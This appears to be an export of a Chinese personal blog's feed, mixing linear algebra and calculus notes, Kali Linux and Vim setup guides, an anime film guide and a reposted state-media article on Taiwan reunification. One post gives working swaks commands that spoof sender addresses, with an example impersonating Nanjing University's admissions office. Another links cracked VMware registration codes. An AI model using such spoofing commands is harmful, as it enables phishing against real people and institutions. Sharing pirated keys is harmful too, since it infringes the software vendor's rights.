\\end{pmatrix} $$ 验证（可选）： $$ A \\cdot A^{-1} = \\begin{pmatrix} 1 \u0026 2 \\\\ 3 \u0026 4 \\end{pmatrix} \\begin{pmatrix} -2 \u0026 1 \\\\ \\frac{3}{2} \u0026 -\\frac{1}{2} \\end{pmatrix} = \\begin{pmatrix} 1 \\times (-2) + 2 \\times \\frac{3}{2} \u0026 1 \\times 1 + 2 \\times (-\\frac{1}{2}) \\\\ 3 \\times (-2) + 4 \\times \\frac{3}{2} \u0026 3 \\times 1 + 4 \\times (-\\frac{1}{2}) \\end{pmatrix} = \\begin{pmatrix} 1 \u0026 0 \\\\ 0 \u0026 1 \\end{pmatrix} = I_2 $$ 验证成立。\n二、初等变换法求逆矩阵 1. 核心原理 对于n阶可逆矩阵$A$，构造增广矩阵$[A \\mid I_n]$（$I_n$为n阶单位矩阵），通过初等行变换（不可混用列变换）将左侧的$A$化为$I_n$，此时右侧原$I_n$会同步化为$A^{-1}$，即： $$ [A \\mid I_n] \\xrightarrow{初等行变换} [I_n \\mid A^{-1}] $$2. 关键步骤 构造增广矩阵：将$A$与同阶单位矩阵并排拼接，形成$[A \\mid I_n]$； 初等行变换（仅3种：换行、某行乘非零常数、某行加另一行的$k$倍）； 当左侧$A$化为$I_n$时，右侧矩阵即为$A^{-1}$； 验证（可选）：计算$A \\cdot A^{-1}$，若结果为$I_n$则正确。 3. 示例：用初等变换法求3阶矩阵的逆 设$A = \\begin{pmatrix} 1 \u0026amp; 0 \u0026amp; 1 \\ 2 \u0026amp; 1 \u0026amp; 0 \\ -3 \u0026amp; 2 \u0026amp; -5 \\end{pmatrix}$，求$A^{-1}$。\n步骤1：构造增广矩阵$[A \\mid I_3]$ $$ [A \\mid I_3] = \\begin{pmatrix} 1 \u0026 0 \u0026 1 \u0026 \\vdots \u0026 1 \u0026 0 \u0026 0 \\\\ 2 \u0026 1 \u0026 0 \u0026 \\vdots \u0026 0 \u0026 1 \u0026 0 \\\\ -3 \u0026 2 \u0026 -5 \u0026 \\vdots \u0026 0 \u0026 0 \u0026 1 \\end{pmatrix} $$ 步骤2：初等行变换\n消去第2、3行第1列元素：\n第2行 = 第2行 - 2×第1行：$R_2 = R_2 - 2R_1$ 第3行 = 第3行 + 3×第1行：$R_3 = R_3 + 3R_1$ 得到： $$ \\begin{pmatrix} 1 \u0026 0 \u0026 1 \u0026 \\vdots \u0026 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 -2 \u0026 \\vdots \u0026 -2 \u0026 1 \u0026 0 \\\\ 0 \u0026 2 \u0026 -2 \u0026 \\vdots \u0026 3 \u0026 0 \u0026 1 \\end{pmatrix} $$ 消去第3行第2列元素：\n第3行 = 第3行 - 2×第2行：$R_3 = R_3 - 2R_2$ 得到： $$ \\begin{pmatrix} 1 \u0026 0 \u0026 1 \u0026 \\vdots \u0026 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 -2 \u0026 \\vdots \u0026 -2 \u0026 1 \u0026 0 \\\\ 0 \u0026 0 \u0026 2 \u0026 \\vdots \u0026 7 \u0026 -2 \u0026 1 \\end{pmatrix} $$ 化为行最简形（首元为1，消去上方对应元素）：\n第3行 = 第3行 × $\\frac{1}{2}$：$R_3 = \\frac{1}{2}R_3$ 第1行 = 第1行 - 1×第3行：$R_1 = R_1 - R_3$ 第2行 = 第2行 + 2×第3行：$R_2 = R_2 + 2R_3$ 最终得到： $$ \\begin{pmatrix} 1 \u0026 0 \u0026 0 \u0026 \\vdots \u0026 -\\frac{5}{2} \u0026 1 \u0026 -\\frac{1}{2} \\\\ 0 \u0026 1 \u0026 0 \u0026 \\vdots \u0026 5 \u0026 -1 \u0026 1 \\\\ 0 \u0026 0 \u0026 1 \u0026 \\vdots \u0026 \\frac{7}{2} \u0026 -1 \u0026 \\frac{1}{2} \\end{pmatrix} $$ 步骤3：得到逆矩阵 左侧已化为$I_3$，右侧即为$A^{-1}$： $$ A^{-1} = \\begin{pmatrix} -\\frac{5}{2} \u0026 1 \u0026 -\\frac{1}{2} \\\\ 5 \u0026 -1 \u0026 1 \\\\ \\frac{7}{2} \u0026 -1 \u0026 \\frac{1}{2} \\end{pmatrix} $$ 验证（可选）： 计算$A \\cdot A^{-1}$，结果为$I_3$（过程略），验证成立。\n","date":"2025-11-02T21:54:18+08:00","permalink":"https://www.retr0.xyz/p/%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E6%B1%82%E9%80%86%E7%9F%A9%E9%98%B5/","title":"几种方法求逆矩阵"},{"content":"新华社北京10月28日电\n钟台文\n解决台湾问题、实现祖国完全统一，是全体中华儿女的共同愿望，也是中华民族伟大复兴的应有之义。两岸同属一个中国，祖国统一大势不可阻挡，这是中华民族走向伟大复兴的时、势、义所决定的。统一不是一种选择，而是一种必然。在中华民族走向伟大复兴的历史征程中，两岸中华儿女一定能够早日解决台湾问题，实现祖国完全统一，共享民族复兴荣耀。\n两岸统一是民心所向 在中华民族几千年的历史长河中，统一始终是历史发展的主流。中华民族书写了辉煌的历史，创造了灿烂的文明，深刻认识到 “统则强、分则乱” 的兴衰规律，形成了追求 “大一统” 的共同价值取向。自宋元以来，台湾绝大多数时间都是统一的多民族国家的一部分。即便是在被日本非法侵占的 50 年里，台湾同胞武装、非武装反抗日本殖民统治从未停止，更有数万人胸怀 “欲救台湾，必先救祖国” 的信念，奔赴祖国大陆参加抗日战争，最终与大陆同胞共同取得抗战的伟大胜利，台湾随之光复、回归祖国。这充分表明，台湾同胞具有光荣的爱国主义传统。两岸同胞同属中华民族，都是中国人，完成国家统一是全体中华儿女孜孜以求的愿望。有全体 14 亿多中国人汇聚的智慧和力量作支撑，实现国家统一的民意无比坚实、基础无比雄厚、力量无比强大。\n在中国共产党的引领推动下，70 多年来特别是两岸隔绝状态打破以来，两岸关系获得长足发展。两岸交流合作日益广泛，互动往来日益密切，给两岸同胞特别是台湾同胞带来实实在在的好处，充分说明两岸和则两利、合则双赢，两岸同胞走近走亲的强烈意愿是任何力量都压制不了的，两岸交流交往交融的时代大潮是任何力量都阻挡不了的。两岸关系发展，特别是祖国大陆广泛惠及台湾同胞的政策举措，契合了广大台湾同胞的心声，塑造了台湾社会要和平、要发展、要交流、要合作的主流民意。\n在中华民族实现国家完全统一的伟大进程中，“台独” 分裂势力不过是蚍蜉撼树、螳臂当车。2300 万台湾同胞都是中华民族一分子，都是中国人。“台独” 分裂势力大肆推动 “去中国化”“渐进台独”，愚弄台湾民众，尤其是毒害青少年一代，制造台湾社会 “分离意识”，严重毒害台湾同胞心灵。“台独” 分裂势力置台湾民众命运与台湾发展前途于不顾，不惜裹挟台湾社会为其政治私利垫背，给台湾带来深重祸患，危害台湾前途。“台独” 分裂势力一意孤行，背弃民族大义，甘当美国等西方国家 “以台遏华” 的棋子，配合其打压遏制大陆发展，甚至不惜将民族利益出卖给外部势力，损害两岸同胞共同利益和中华民族根本利益，终将遭到历史和人民的审判和惩处。\n两岸统一是大义所在 1949 年以来，中国共产党始终把解决台湾问题、实现祖国完全统一作为矢志不渝的历史任务。党的十八大以来，以习近平同志为核心的党中央，牢牢把握对台工作的历史方位和时代使命，引领两岸关系发展方向，塑造祖国必然统一大势。新时代新征程，中国共产党立志于中华民族千秋伟业，在以中国式现代化全面推进中华民族伟大复兴的进程中，坚定不移推进祖国统一大业。\n国家统一是全体中国人民意志的强烈表达。解决台湾问题是中国人自己的事，只能也必须由包括台湾同胞在内的 14 亿多中国人民共同决定。这不仅是民族情感使然，更是国家行使主权的必然。制度的不同，改变不了两岸同属一个国家、一个民族的客观事实。外部的干涉，阻挡不了家国团圆的历史大势。统一，是中华民族根本利益所在，也是台湾同胞福祉的最大保障。\n台湾回归中国是二战后国际秩序的重要组成部分，支持中国统一是维护国际法权威和战后国际秩序的应有之义。80 年前，中国人民浴血奋战，赢得了抗日战争的伟大胜利；80 年后，中国致力于维护战后国际秩序，决不允许历史悲剧重演。维护国家统一和领土完整，是国际法的基本原则，是每个主权国家的基本权利。一个中国原则是国际社会普遍共识和国际关系基本准则，国际社会广泛理解支持中国人民完成国家统一的正义事业。从国际大义上讲，中国人民解决台湾问题，事关维护《联合国宪章》的原则，符合人类社会进步和正义的潮流。中国必将统一，既由战后国际秩序所决定，也为站在人类文明与进步一边的绝大多数国家所支持。无论外部势力如何捣乱，中国终将统一、也必将统一的历史大势不可阻挡。\n两岸统一是大势所趋 习近平总书记深刻指出：“台湾问题因民族弱乱而产生，必将随着民族复兴而解决。” 决定两岸关系走向的关键因素是祖国大陆的发展进步。经过数十年的发展，祖国大陆的经济实力、科技实力、军事实力、文化软实力及综合国力大幅跃升，国际地位显著提高，国际影响力明显增强，日益走近世界舞台中央。中华民族伟大复兴势不可挡，国家统一事业也正进入新的历史进程。祖国大陆发展的优势和条件，持续转化为推进统一的能力和动力，必将不断促进两岸社会交流交融，加深两岸同胞利益和情感联结，增进共同的民族、文化和国家认同，牵引两岸关系朝统一方向前行。祖国大陆的实力决定了 “台独” 分裂没有出路、统一不可抗拒，决定了外部干涉不会得逞、“倚外谋独” 只会失败，台湾的出路有且只有一条，就是走向祖国完全统一。\n中华民族一定是强必统，统更强。从两岸实力对比和国际格局演变趋势看，只会对支持统一的正义一方越来越有利。两岸坐下来谈，谈出合理的 “两制” 台湾方案，不仅台湾现有社会制度会得到充分尊重、实现高度自治，台湾同胞还可以更广泛参与国家治理和国际事务，与大陆同胞一道当家做主，在更广袤的土地上实现治国安邦、经天纬地的理想。正如孙中山先生所言：\n“‘统一’是中国全体国民的希望。能够统一，全国人民便享福；不能统一，便要受害。”\n青山遮不住，毕竟东流去。两岸统一既是历史定论、法理必然，也是民心所向、大义所在，更是不可阻挡、不可逆转的时代洪流。国家统一、民族复兴的历史车轮滚滚向前，祖国完全统一一定要实现，也一定能够实现！\n","date":"2025-10-29T15:14:16+08:00","image":"https://www.retr0.xyz/post/%E6%96%B0%E9%97%BB/ece126ea-8f4b-4807-8eb6-df9ea636296c.jpeg","permalink":"https://www.retr0.xyz/p/%E7%BD%B2%E5%90%8D%E6%96%87%E7%AB%A0%E7%A5%96%E5%9B%BD%E5%BF%85%E7%84%B6%E7%BB%9F%E4%B8%80%E5%8A%BF%E4%B8%8D%E5%8F%AF%E6%8C%A1/","title":"署名文章：祖国必然统一势不可挡"},{"content":"一、罗尔定理（Rolle\u0026rsquo;s Theorem） 1. 核心条件 函数 $f(x)$ 在闭区间 $[a, b]$ 上 连续； 函数 $f(x)$ 在开区间 $(a, b)$ 内 可导； 端点函数值相等：$f(a) = f(b)$。 2. 结论 存在至少一点 $\\xi \\in (a, b)$，使得 $f\u0026rsquo;(\\xi) = 0$。\n3. 使用例子 设 $f(x) = x^2 - 2x$，区间 $[0, 2]$。\n验证条件：$f(x)$ 是多项式（闭区间连续、开区间可导）；$f(0) = 0$，$f(2) = 0$，满足 $f(0)=f(2)$； 应用结论：求导得 $f\u0026rsquo;(x) = 2x - 2$，令 $f\u0026rsquo;(x)=0$，解得 $x=1$，即 $\\xi=1 \\in (0,2)$，符合定理。 二、拉格朗日中值定理（Lagrange\u0026rsquo;s Mean Value Theorem） 1. 核心条件 函数 $f(x)$ 在闭区间 $[a, b]$ 上 连续； 函数 $f(x)$ 在开区间 $(a, b)$ 内 可导。 2. 结论 存在至少一点 $\\xi \\in (a, b)$，使得 $f\u0026rsquo;(\\xi) = \\frac{f(b) - f(a)}{b - a}$（几何意义：曲线在 $\\xi$ 处的切线与端点连线平行）。\n3. 使用例子 设 $f(x) = \\ln x$，区间 $[1, e]$。\n验证条件：$f(x)$ 在 $[1,e]$ 连续、$(1,e)$ 可导； 应用结论：端点斜率 $\\frac{f(e) - f(1)}{e - 1} = \\frac{1 - 0}{e - 1} = \\frac{1}{e - 1}$；求导得 $f\u0026rsquo;(x) = \\frac{1}{x}$，令 $\\frac{1}{x} = \\frac{1}{e - 1}$，解得 $x = e - 1 \\in (1,e)$，即 $\\xi = e - 1$，符合定理。 三、柯西中值定理（Cauchy\u0026rsquo;s Mean Value Theorem） 1. 核心条件 函数 $f(x)$、$g(x)$ 均在闭区间 $[a, b]$ 上 连续； 函数 $f(x)$、$g(x)$ 均在开区间 $(a, b)$ 内 可导； 对任意 $x \\in (a, b)$，$g\u0026rsquo;(x) \\neq 0$； 端点函数值不等：$g(a) \\neq g(b)$。 2. 结论 存在至少一点 $\\xi \\in (a, b)$，使得 $\\frac{f(b) - f(a)}{g(b) - g(a)} = \\frac{f\u0026rsquo;(\\xi)}{g\u0026rsquo;(\\xi)}$（拉格朗日中值定理的推广，$g(x)=x$ 时退化为拉格朗日定理）。\n3. 使用例子 设 $f(x) = \\sin x$，$g(x) = \\cos x$，区间 $[0, \\frac{\\pi}{2}]$。\n验证条件：$f(x)$、$g(x)$ 均连续可导；$g\u0026rsquo;(x) = -\\sin x$，在 $(0, \\frac{\\pi}{2})$ 内不为0；$g(0)=1 \\neq g(\\frac{\\pi}{2})=0$； 应用结论：增量比 $\\frac{f(\\frac{\\pi}{2}) - f(0)}{g(\\frac{\\pi}{2}) - g(0)} = \\frac{1 - 0}{0 - 1} = -1$；导数比 $\\frac{f\u0026rsquo;(\\xi)}{g\u0026rsquo;(\\xi)} = \\frac{\\cos \\xi}{-\\sin \\xi} = -\\cot \\xi$；令 $-\\cot \\xi = -1$，解得 $\\xi = \\frac{\\pi}{4} \\in (0, \\frac{\\pi}{2})$，符合定理。 ","date":"2025-10-29T12:31:38+08:00","permalink":"https://www.retr0.xyz/p/%E4%B8%89%E4%B8%AA%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86/","title":"三个微分中值定理"},{"content":"一、矩阵的秩（核心定义） 矩阵的秩是最高阶非零子式的阶数，也等于矩阵行向量组/列向量组的“极大无关组个数”(通俗说：最多能找出多少个不互相“多余”的行/列)记为 $$r(A)$$。\n二、核心性质 非负性与有界性：$\\displaystyle 0 \\leq r(A) \\leq \\min{m, n}$（秩是0或正整数，不超过行数和列数）； 零矩阵专属：$\\displaystyle A = O \\iff r(A) = 0$（零矩阵秩为0，反之亦然）； 转置不变性：$\\displaystyle r(A^T) = r(A)$（矩阵与其转置秩相等）； 初等变换不变性：初等行/列变换后，矩阵秩不变； 和秩不等式：$\\displaystyle r(A + B) \\leq r(A) + r(B)$（两矩阵和的秩不超过各自秩的和）； 乘积秩不等式：$\\displaystyle r(AB) \\leq \\min{r(A), r(B)}$（两矩阵乘积的秩不超过任一矩阵的秩）； 可逆矩阵作用：$\\displaystyle r(PA) = r(AQ) = r(PAQ) = r(A)$（可逆矩阵左乘/右乘，秩不变）； 伴随矩阵秩关系： 若$\\displaystyle r(A) = n$，则$\\displaystyle r(A^*) = n$； 若$\\displaystyle r(A) = n-1$，则$\\displaystyle r(A^*) = 1$； 若$\\displaystyle r(A) \u0026lt; n-1$，则$\\displaystyle r(A^*) = 0$； 分块矩阵秩：$\\displaystyle r\\begin{pmatrix} A \u0026amp; O \\ O \u0026amp; B \\end{pmatrix} = r(A) + r(B)$（对角分块矩阵的秩等于各块秩的和）。 ","date":"2025-10-28T15:27:38+08:00","permalink":"https://www.retr0.xyz/p/%E7%9F%A9%E9%98%B5%E7%9A%84%E7%A7%A9%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/","title":"矩阵的秩及其性质"},{"content":"判断n阶方阵A是否可逆，核心看以下快速等价条件（满足其一即可，优先选前2个最便捷）：\n行列式非零：$|A| \\neq 0$（直接计算行列式，最快上手）； 矩阵满秩：秩$r(A) = n$（通过初等行变换看是否能化为单位矩阵）； 齐次方程组$AX = 0$只有零解； 行/列向量组线性无关； 存在方阵B，使得$AB = BA = I$（I为单位矩阵）。 ","date":"2025-10-28T15:27:38+08:00","permalink":"https://www.retr0.xyz/p/%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E7%9F%A9%E9%98%B5%E6%98%AF%E5%90%A6%E5%8F%AF%E9%80%86/","title":"快速判断矩阵是否可逆"},{"content":"1. 伪装学校邮件 大前提（原理）： 大多数学校的邮箱都可以使用代发服务 重要提醒： 接收邮件的邮箱只有网易系，qq邮箱因为安全限制问题无法接收到 打开终端并按需要输入指令\n指令例：\n1 swaks --body \u0026#34;学校紧急通知\u0026#34; --header \u0026#34;Subject:教务处\u0026#34; -t ⽬标邮箱@XXX.com -f admin@XXX.edu.cn 参数解释\nbody参数是发送过去邮件的内容\nheader是发送过去邮件的标题\n-t是我们的目标邮箱\n-f是发送者的邮箱\n\u0026ndash;attach是指定要附加的文件的路径\n10月19日更新\n使用例：\n这里我们输入以下代码\n1 swaks --body \u0026#34;恭喜你已被我所拟录取，请在24小时内确认是否同意待录取，12小时后仍未确认的将取消资格。\u0026#34; --header \u0026#34;Subject:南京大学招生办：待录取通知\u0026#34; -t example@163.com -f zsb@nju.edu.cn 回车后查看接收邮箱\n发现正常接收了邮件，但是有提示可能伪造的标\n因此，在生活中各位务必确认邮件内容的真实性。\n","date":"2025-10-27T22:43:38+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/email.jpg","permalink":"https://www.retr0.xyz/p/swaks%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6/","title":"swaks伪造邮件"},{"content":"虽说目前官网开放了个人免费下载使用，但是注册什么的对很多人还不是太友好，所以这里直接提供打包好的安装包和注册码\n链接：https://pan.quark.cn/s/85f0cadc8f12\n下载不多说，客户端下还是找解析网站自行解决\n安装除了位置自己看着改一下，其他下一步就完事了\n最后软件让你注册时，请输入压缩包内提供的注册码即可\n","date":"2025-10-27T22:39:38+08:00","permalink":"https://www.retr0.xyz/p/vmware%E7%9A%84%E5%AE%89%E8%A3%85/","title":"VMware的安装"},{"content":"感谢jm汉化组\n切换简中语言包 打开终端\n1 sudo dpkg-reconfigure locales 在打开的界面中使用pg up，pg dn，⬆️，⬇️翻页，使用空格选择，按tab切换到下方的确定和取消，按enter确定\n这里我们选择 zh_CN.UTF-8\n使用reboot重启即可\n换源 所谓换源就是切换软件仓库源\n这里需要修改以下文件sources.list\n在终端中输入\n1 sudo vim /etc/apt/sources.list ⚠️⚠️⚠️注意：这里需要使用到世界上最伟大的编辑器（没有之一）使用方法见下面的文章\n[retr0的小窝：Vim的使用](Vim的使用\n在文件末加上以下任意国内源\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 官方源(国外的太慢不推荐) deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #南京大学 deb https://mirrors.nju.edu.cn/kali kali-rolling main non-free contrib deb-src https://mirrors.nju.edu.cn/kali kali-rolling main non-free contrib 添加并保存后需要到终端中更新\n1 sudo apt upgrade 注意：部分情况可能报错\n1 2 W: GPG 错误：http://mirrors.ustc.edu.cn/kali kali-rolling InRelease: 下列签名无效： EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository \u0026lt;devel@kali.org\u0026gt; E: 仓库 “http://mirrors.ustc.edu.cn/kali kali-rolling InRelease” 没有数字签名。 要解决这个问题，你需要下载并安装正确的GPG签名：\n1 2 wget archive.kali.org/archive-key.asc apt-key add archive-key.asc 然后再更新软件包列表即可\n调整文字大小（可选） 注意：这里我们去设置里在dpi选项中调整，而不要去“display”选项中调整，因为效果很差\n","date":"2025-10-27T18:27:38+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/kali2.webp","permalink":"https://www.retr0.xyz/p/1.2kali%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%8C%96%E9%85%8D%E7%BD%AE%E6%9B%B4%E9%80%82%E5%90%88%E4%B8%AD%E5%9B%BD%E5%AE%9D%E5%AE%9D%E7%9A%84kali/","title":"1.2Kali的本地化配置：更适合中国宝宝的Kali"},{"content":"遲到的補完：《終》觀影指南 2025年10月31日，《天鹰战士：最后的冲击》将登录大陆内各影院，但我们仍用《新·福音战士剧场版：终》来称呼它，或者更简单的《终》也可以。\n然而上文表述都是不准确的，它真正的名字《シン・エヴァンゲリオン劇場版𝄇》（这么多片假名谁看得懂啊）里并没有“终”或者“最后”的字样，只有一个音乐符号**𝄇——它是乐谱中的段落终止线，表示一个完整段落的结束**。其副标题Thrice upon a time出自同名科幻小说，后者同时也是《命运石之门》的原型。\n即使你没看过EVA，也可能晓得EVA很难看懂，甚至形成了专门的学问叫“E学”。不过笔者在此只提供EVA的基本认识和一套简单易懂的世界观，希望对各位提供些许帮助。\n你所必须知道的… 许多年前，“第一先祖种族”FAR（就是牛逼外星人）生活在银河系内。它们在灭亡之前制造了名为“月亮”的运输船，月亮可以通过颜色来区分，比如在地球上空的白月，称为“白之月”。运输船运输的是生命之种、朗基努斯之枪、死海文书。\n它们仨分别是用来产生生命的（白之月的“亚当”产生“使徒”，黑之月的“莉莉丝”产生地球生物）、前者的开关（为了生物多样性，FAR要求一个星球上只允许一颗生命之种起作用）和前两者的使用说明书。\n40亿年前，白之月降落到南极区域，亚当繁衍“使徒”，使徒拥有生命之果，所以体型巨大而且难杀；之后，黑之月也来了，出于未知的原因，黑之月中的朗枪没有抑制莉莉丝，于是莉莉丝产生生命，人类拥有智慧之果，能造EVA去干使徒。亚当这边则受委屈了，白之月携带的朗基努斯之枪抑制了它产生生命。\n1947年，掌控人类的组织Seele（“灵魂”的德语）发现了死海文书，相信这是“神明”的启示，他们就要执行上面的计划（这就是EVA宗教色彩的来源，但EVA从任何角度上都不应当被定义为“宗教动漫”）。\n1999年，人类在南极发现了白之月撞击地球时产生了巨大坑洞，并在其内部发现了亚当，称为“第一使徒”。为了验证死海古书上的内容，人类进行了一些实验，导致南极的亚当发生了暴走，其释放出的能量对地球造成了不小的影响，所以EVA可以说是末世作品。\n2003年，人类在日本发现了巨大的地洞，也就是黑之月，Seele的下属机构NERV（“神经”的英语）的总部就建在其中，表面上是为了对抗使徒，实际是为了执行Seele的人类补完计划（就是全人类共同进化呗，灵魂脱离橙汁组成的肉体，合为一个整体，地球球长总喜欢搞这种）。\nNERV通过克隆亚当和莉莉丝的细胞制作了“终极泛用人型决战兵器，人造人EVANGELION”来打败使徒，由此可知，EVA并不是机甲番。\n政策的制定者Seele、政策的执行者NERV、在战斗一线的少年少女们——EVA的故事就是他们三者之间以及内部的矛盾。\n𝄇之前，发生了什么？ 我们不得不承认，如果《终》是你接触的第一步EVA作品，那诸位在电影院基本上也就是看个热闹，别说看懂EVA的内核、导演庵野秀明的表达、主角的愿景，最基本的这几个人在干什么都会搞不明白，所以介绍这部电影之前发生了什么，是很有必要的。\n旧EVA（26集TV+两部剧场版）我们不再讲了，只需要知道在旧剧场版的最后，人类补完计划没有得到完美执行，世界进行了一次轮回而进入到新EVA的故事即可。\n《终》之前有三部剧场版《序》《破》《Q》，我们简要说一说各个人物的动机和行为，相信这会对各位看明白《终》起到一定帮助。\n执行人类补完计划的势力NERV：碇源堂和冬月教授。碇源堂争取到了Seele老登们的信任，他希望主导人类补完计划，从而在人与人完全没有隔阂的世界中和老婆团聚；冬月教授则是他的得力助手。\n反对NERV的Wille（意为意志）：美里小姐、律子博士及其他机组人员。美里小姐的爱人良治在Wille起义时牺牲，继承了爱人意志的她一方面要阻止真嗣再一次不小心毁灭地球，另一方面又要阻止碇司令的疯狂计划，她能够成功吗；律子博士是她的得力助手。\nEVA驾驶员：碇真嗣、明日香、绫波丽、真希波。碇真嗣先是在《序》《破》中被老爹骗去帮忙执行计划，而后又在《Q》中和薰一起进他爹圈套，在《终》里他还能拯救世界吗；明日香在之前的作战中成为了半使徒半生物的存在，迷茫的她就要全力帮助美里小姐，等会，她会不会是克隆人；至少我们确定绫波丽是克隆人，是碇源堂妻子的克隆，《序》《破》中出现了白衣服的绫波丽（白丽），她对真嗣觉醒了感情，也就是“爱他”，却连同初号机被封印了，《Q》《终》出现的黑丽是否会觉醒“爱我”呢；真希波，她对世界真相的认识似乎比Seele还要多，我们不知道她为什么会帮助真嗣，但事实就是这样。\n生活在第三村的人们：真嗣以前的同班同学们，在《Q》中差点毁灭世界的他，需要一些友人们的帮助呢……\n总而言之，神秘兮兮的那群人干神神鬼鬼的事情本质上都是“碇司令为了见老婆，在举办神明的高科技仪式”，其他人则都是来阻止他的，阻止的方式就是开生物高达嗯打。\n万一，你喜欢上了EVA？ 在观影之后，各位或许会对EVA产生了更多的兴趣，或许也想要和笔者一样对“E学”进行一些学习和研究。对此，笔者的回答是：\n正如《终》里的台词“再见是希望彼此再见时说的话”，各位读者朋友们，\n再见。\n​ 終劇\n","date":"2025-10-27T18:27:38+08:00","image":"https://www.retr0.xyz/post/%E5%BD%B1%E8%A7%86/%E5%9B%BE%E7%89%871.png","permalink":"https://www.retr0.xyz/p/%E9%81%B2%E5%88%B0%E7%9A%84%E8%A3%9C%E5%AE%8C%E7%B5%82%E8%A7%80%E5%BD%B1%E6%8C%87%E5%8D%97/","title":"遲到的補完：《終》觀影指南"},{"content":"1. 下载kali 几种可选方案：\n官网下载：Get Kali | Kali Linux选择VMware下载即可（不推荐）\n镜像源下载：阿里云镜像源kali-images安装包下载_开源镜像站-阿里云\n​ 清华镜像源清华大学开源软件镜像站 | Tsinghua Open Source Mirror\n​ 中科大镜像源Index of /kali-images/\n以上几个都是从最新版本中找到后缀为vmware-amd64.7z的下载即可\n2. 安装kali 将下载好的压缩包解压在某文件夹内\n然后打开VMware Workstation Pro点击主页上的【打开虚拟机】\n选择你刚刚解压出的那一堆文件中后缀为vmx的文件即可（一般会自动筛选的）\n3. 登录kali 默认超级用户名和密码均为kali，\n至此，\n享受你的个人kali吧。\n","date":"2025-10-27T12:46:38+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/kali.jpeg","permalink":"https://www.retr0.xyz/p/1.1kali%E7%9A%84%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85/","title":"1.1Kali的下载与安装"},{"content":"一、Vim 基本操作 1. 启动和退出 Vim 启动 Vim:\n1 vim filename 退出 Vim:\n正常退出并保存：:wq 或 ZZ\n仅退出（不保存）：:q\n强制退出（不保存）：:q!\n仅保存文件：:w\n2. 模式切换 Vim 有多种模式，最常用的是以下几种：\n正常模式（Normal Mode）：Vim 启动时默认的模式，可以执行各种命令，如移动光标、删除文本等。按 Esc 键进入。\n插入模式（Insert Mode）：可以输入文本。按 i 进入，按 Esc 返回正常模式。\n可视模式（Visual Mode）：用于选中文本块。按 v 进入，可视模式下可使用方向键选择文本。\n常用模式切换命令：\ni：进入插入模式，在当前光标位置前插入。\na：进入插入模式，在当前光标位置后插入。\no：在当前行下方打开新行并进入插入模式。\nv：进入可视模式。\nV：进入可视行模式（选中整行）。\nCtrl + v：进入可视块模式（列选择）。\n二、Vim 光标移动命令 1. 基本移动 h：向左移动一个字符。\nl：向右移动一个字符。\nj：向下移动一行。\nk：向上移动一行。\n2. 行内移动 0：移动到行首。\n^：移动到本行第一个非空白字符。\n$：移动到行尾。\n3. 单词移动 w：移动到下一个单词的开头。\ne：移动到当前或下一个单词的末尾。\nb：移动到上一个单词的开头。\n4. 页面移动 Ctrl + u：向上滚动半页。\nCtrl + d：向下滚动半页。\nCtrl + b：向上滚动一整页。\nCtrl + f：向下滚动一整页。\nG：移动到文件末尾。\ngg：移动到文件开头。\n5. 行跳转 :n：跳转到第 n 行。\nnG：跳转到第 n 行。\n三、Vim 文本编辑命令 1. 插入和删除 i：进入插入模式。\na：在当前光标后插入文本。\no：在当前行下方新开一行并进入插入模式。\ndd：删除当前行。\nD：删除当前光标到行尾的所有内容。\nx：删除当前光标所在的字符。\ndw：删除当前光标到单词末尾的内容。\nu：撤销上一步操作。\nCtrl + r：重做上一步撤销的操作。\n2. 复制、剪切与粘贴 yy：复制当前行。\nyw：复制一个单词。\np：粘贴到光标后。\nP：粘贴到光标前。\ndd：剪切当前行。\ndaw：剪切一个单词。\n3. 替换与修改 r：替换当前字符。\nR：进入替换模式，从光标开始的字符将被逐个替换，直到退出替换模式为止。\ncw：修改当前单词（删除当前单词并进入插入模式）。\nc$：修改从光标位置到行尾的内容。\n四、Vim 查找与替换命令 1. 查找 /pattern：向下查找 pattern（正则表达式）。\n?pattern：向上查找 pattern。\nn：在查找模式下，查找下一个匹配项。\nN：在查找模式下，查找上一个匹配项。\n*：查找光标所在单词的下一个匹配项。\n#：查找光标所在单词的上一个匹配项。\n2. 替换 :s/old/new：替换当前行的第一个匹配的 old 为 new。\n:s/old/new/g：替换当前行的所有 old 为 new。\n:%s/old/new/g：替换整个文件中的所有 old 为 new。\n:%s/old/new/gc：替换整个文件中的所有 old 为 new，每次替换前提示确认。\n五、Vim 多窗口与多文件操作 1. 多窗口操作 :split 或 :sp：水平分割窗口。\n:vsplit 或 :vsp：垂直分割窗口。\nCtrl + w, 